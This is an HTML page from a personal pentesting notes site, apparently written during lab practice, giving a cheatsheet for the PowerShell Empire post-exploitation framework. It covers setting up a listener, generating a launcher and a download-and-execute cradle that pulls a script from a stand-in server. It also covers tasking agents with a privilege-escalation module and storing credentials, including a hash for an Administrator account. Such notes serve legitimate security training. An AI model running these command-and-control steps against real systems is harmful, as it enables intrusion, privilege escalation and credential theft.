<!DOCTYPE html>
<html class="writer-html5" lang="en" >
<head>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
      <link rel="shortcut icon" href="../../img/favicon.ico" />
    <title>Powershell Empire - Hacking Notes</title>
    <link rel="stylesheet" href="../../css/theme.css" />
    <link rel="stylesheet" href="../../css/theme_extra.css" />
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/10.5.0/styles/github.min.css" />
    
      <script>
        // Current page data
        var mkdocs_page_name = "Powershell Empire";
        var mkdocs_page_input_path = "Cheatsheets/Powershell_Empire.md";
        var mkdocs_page_url = null;
      </script>
    
    <script src="../../js/jquery-3.6.0.min.js" defer></script>
    <!--[if lt IE 9]>
      <script src="../../js/html5shiv.min.js"></script>
    <![endif]-->
      <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/10.5.0/highlight.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/10.5.0/languages/python.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/10.5.0/languages/javascript.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/10.5.0/languages/bash.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/10.5.0/languages/powershell.min.js"></script>
      <script>hljs.initHighlightingOnLoad();</script> 
</head>

<body class="wy-body-for-nav" role="document">

  <div class="wy-grid-for-nav">
    <nav data-toggle="wy-nav-shift" class="wy-nav-side stickynav">
    <div class="wy-side-scroll">
      <div class="wy-side-nav-search">
          <a href="../.." class="icon icon-home"> Hacking Notes
        </a><div role="search">
  <form id ="rtd-search-form" class="wy-form" action="../../search.html" method="get">
      <input type="text" name="q" placeholder="Search docs" title="Type search term here" />
  </form>
</div>
      </div>

      <div class="wy-menu wy-menu-vertical" data-spy="affix" role="navigation" aria-label="Navigation menu">
              <ul>
                <li class="toctree-l1"><a class="reference internal" href="../..">Welcome to MkDocs</a>
                </li>
              </ul>
              <p class="caption"><span class="caption-text">Cheatsheets</span></p>
              <ul class="current">
                  <li class="toctree-l1"><a class="reference internal" href="../101_windows/">Windows Privilege Escalation 101</a>
                  </li>
                  <li class="toctree-l1"><a class="reference internal" href="../2022-07-09-impacket/">2022 07 09 impacket</a>
                  </li>
                  <li class="toctree-l1"><a class="reference internal" href="../2022-07-10-bloodhound/">BloodHound</a>
                  </li>
                  <li class="toctree-l1"><a class="reference internal" href="../2022-07-30-file-transfers-101/">File Transfers 101</a>
                  </li>
                  <li class="toctree-l1"><a class="reference internal" href="../2022-07-30-pivot-101/">Pivoting & Lateral Movement</a>
                  </li>
                  <li class="toctree-l1"><a class="reference internal" href="../2022-07-30-x-without-y/">X Without Y (Living off the Land)</a>
                  </li>
                  <li class="toctree-l1"><a class="reference internal" href="../2022-08-07-auth-bypass-headers/">Auth Bypass Headers"</a>
                  </li>
                  <li class="toctree-l1"><a class="reference internal" href="../2022-08-10-golden-ticket/">Golden Tickets</a>
                  </li>
                  <li class="toctree-l1"><a class="reference internal" href="../2022-10-04-pentesting-email-servers/">Email Pentesting</a>
                  </li>
                  <li class="toctree-l1"><a class="reference internal" href="../2023-01-15-101_icalcs/">ICACLs 101</a>
                  </li>
                  <li class="toctree-l1"><a class="reference internal" href="../Kubernetes_Pentesting/">Pentesting Kubernetes</a>
                  </li>
                  <li class="toctree-l1 current"><a class="reference internal current" href="./">Powershell Empire</a>
    <ul class="current">
    <li class="toctree-l2"><a class="reference internal" href="#credentials">Credentials</a>
    </li>
    </ul>
                  </li>
                  <li class="toctree-l1"><a class="reference internal" href="../cheatsheet_js/">Commands</a>
                  </li>
                  <li class="toctree-l1"><a class="reference internal" href="../hydra_cheat_sheet/">Hydra Cheat Sheet</a>
                  </li>
                  <li class="toctree-l1"><a class="reference internal" href="../linux/">Linux 101</a>
                  </li>
                  <li class="toctree-l1"><a class="reference internal" href="../msfvenom_cheatsheet/">MSFVenom Cheatsheet</a>
                  </li>
                  <li class="toctree-l1"><a class="reference internal" href="../splunk_cheat_sheet/">Splunk Cheatsheet</a>
                  </li>
              </ul>
              <p class="caption"><span class="caption-text">Recon</span></p>
              <ul>
                  <li class="toctree-l1"><a class="reference internal" href="../../Recon/mapping/">Application Mapping</a>
                  </li>
                  <li class="toctree-l1"><a class="reference internal" href="../../Recon/recon/">Recon and Information Gathering</a>
                  </li>
              </ul>
              <p class="caption"><span class="caption-text">Web</span></p>
              <ul>
                  <li class="toctree-l1"><a class="reference internal" href="../../Web/web_hacking/">Web Application Hacking</a>
                  </li>
              </ul>
              <p class="caption"><span class="caption-text">Windows</span></p>
              <ul>
                  <li class="toctree-l1"><a class="reference internal" href="../../Windows/PowerShell/">PowerShell</a>
                  </li>
                  <li class="toctree-l1"><a class="reference internal" href="../../Windows/windows_101/">Windows 101</a>
                  </li>
              </ul>
      </div>
    </div>
    </nav>

    <section data-toggle="wy-nav-shift" class="wy-nav-content-wrap">
      <nav class="wy-nav-top" role="navigation" aria-label="Mobile navigation menu">
          <i data-toggle="wy-nav-top" class="fa fa-bars"></i>
          <a href="../..">Hacking Notes</a>
        
      </nav>
      <div class="wy-nav-content">
        <div class="rst-content"><div role="navigation" aria-label="breadcrumbs navigation">
  <ul class="wy-breadcrumbs">
    <li><a href="../.." class="icon icon-home" alt="Docs"></a> &raquo;</li>
          <li>Cheatsheets &raquo;</li>
      <li>Powershell Empire</li>
    <li class="wy-breadcrumbs-aside">
    </li>
  </ul>
  <hr/>
</div>
          <div role="main" class="document" itemscope="itemscope" itemtype="http://schema.org/Article">
            <div class="section" itemprop="articleBody">
              
                <h1 id="powershell-empire">Powershell Empire</h1>
<p>Started using this today, it's really cool. Takes a lot of the work out of finding scripts to run.</p>
<p>Firing it up:</p>
<pre><code class="language-bash">/data/reset.sh
</code></pre>
<p>Run it with that to reset the database, otherwise it  seems to fail to start, not always though so if you just need to start  it (and it doesn't crash) then do:</p>
<pre><code class="language-bash">./empire
</code></pre>
<p>Setup a Listener</p>
<pre><code class="language-bash">listeners
</code></pre>
<p>Once you're inside that menu do:</p>
<pre><code class="language-bash">uselistener &lt;tab-completion-works-here&gt;
</code></pre>
<p>View options with:</p>
<pre><code class="language-bash">info
</code></pre>
<p>Then use set to configure the connection for your IP/Port:</p>
<pre><code class="language-bash">set Host 10.10.14.3:443
set Port 443
</code></pre>
<p>For the shell to come back the ports need to match (or so it appears)</p>
<p>To start the listener:</p>
<pre><code class="language-bash">execute
</code></pre>
<p>Then run:</p>
<pre><code class="language-bash">launcher powershell
</code></pre>
<p>This will fire back the other half of the shell, which you can execute with IEX(New-Object Net.WebClient)downloadString('http://yoursever/yourfile.ps1')</p>
<p>Interacting with Agents
Head back to the main menu using back
Now type agents to see a list of active agents.
Get the name of the agent you wish to interact with, and type:</p>
<pre><code class="language-bash">interact &lt;agent-name&gt;
(Empire) &gt; interact ASWX9H8G
(Empire: ASWX9H8G) &gt;
</code></pre>
<p>Now you can type:</p>
<pre><code class="language-bash">searchmodule &lt;modulename (not case sensitive)
</code></pre>
<p>Using Modules
Once you've found the module you're looking for run:</p>
<pre><code class="language-bash">usemodule &lt;module-name&gt;
</code></pre>
<p>Then type info and hit enter to see the options:</p>
<pre><code class="language-bash">(Empire: ASWX9H8G) &gt; usemodule privesc/powerup/allchecks
(Empire: powershell/privesc/powerup/allchecks) &gt; info

              Name: Invoke-AllChecks
            Module: powershell/privesc/powerup/allchecks
        NeedsAdmin: False
         OpsecSafe: True
          Language: powershell
MinLanguageVersion: 2
        Background: True
   OutputExtension: None

Authors:
  @harmj0y

Description:
  Runs all current checks for Windows privesc vectors.

Comments:
  https://github.com/PowerShellEmpire/PowerTools/tree/master/P
  owerUp

Options:

  Name  Required    Value                     Description
  ----  --------    -------                   -----------
  Agent True        ASWX9H8G                  Agent to run module on.

</code></pre>
<p>In this case we can just type execute and then hit enter</p>
<pre><code class="language-bash">(Empire: powershell/privesc/powerup/allchecks) &gt; execute
[*] Tasked ASWX9H8G to run TASK_CMD_JOB
[*] Agent ASWX9H8G tasked with task ID 4
[*] Tasked agent ASWX9H8G to run module powershell/privesc/powerup/allchecks
(Empire: powershell/privesc/powerup/allchecks) &gt; [*] Agent ASWX9H8G returned results.
Job started: F9E4KY
[*] Valid results returned by 10.10.10.81
Wait a few seconds. And that should output what it managed to find. 
</code></pre>
<h2 id="credentials">Credentials</h2>
<p>creds add domain username password</p>
<p>Use creds to see all stored credentials.</p>
<p>For some modules you can then just use set CredID <code>&lt;ID number&gt;</code> and not have to type in the username and password.</p>
<p>Getting Trolled By CredTypes
If you see:</p>
<p>[!] A CredID with a plaintext password must be used!</p>
<p>Then check creds.</p>
<p>If the password is the wrong type, readd it with the following:</p>
<p>creds add DESKTOP-7I3S68E Administrator 3130438f31186fbaf962f407711faddb something plaintext</p>
<p>Then just use the new ID and you gucci</p>
              
            </div>
          </div><footer>
    <div class="rst-footer-buttons" role="navigation" aria-label="Footer Navigation">
        <a href="../Kubernetes_Pentesting/" class="btn btn-neutral float-left" title="Pentesting Kubernetes"><span class="icon icon-circle-arrow-left"></span> Previous</a>
        <a href="../cheatsheet_js/" class="btn btn-neutral float-right" title="Commands">Next <span class="icon icon-circle-arrow-right"></span></a>
    </div>

  <hr/>

  <div role="contentinfo">
    <!-- Copyright etc -->
  </div>

  Built with <a href="https://www.mkdocs.org/">MkDocs</a> using a <a href="https://github.com/readthedocs/sphinx_rtd_theme">theme</a> provided by <a href="https://readthedocs.org">Read the Docs</a>.
</footer>
          
        </div>
      </div>

    </section>

  </div>

  <div class="rst-versions" role="note" aria-label="Versions">
  <span class="rst-current-version" data-toggle="rst-current-version">
    
    
      <span><a href="../Kubernetes_Pentesting/" style="color: #fcfcfc">&laquo; Previous</a></span>
    
    
      <span><a href="../cheatsheet_js/" style="color: #fcfcfc">Next &raquo;</a></span>
    
  </span>
</div>
    <script>var base_url = '../..';</script>
    <script src="../../js/theme_extra.js" defer></script>
    <script src="../../js/theme.js" defer></script>
      <script src="../../search/main.js" defer></script>
    <script defer>
        window.onload = function () {
            SphinxRtdTheme.Navigation.enable(true);
        };
    </script>

</body>
</html>
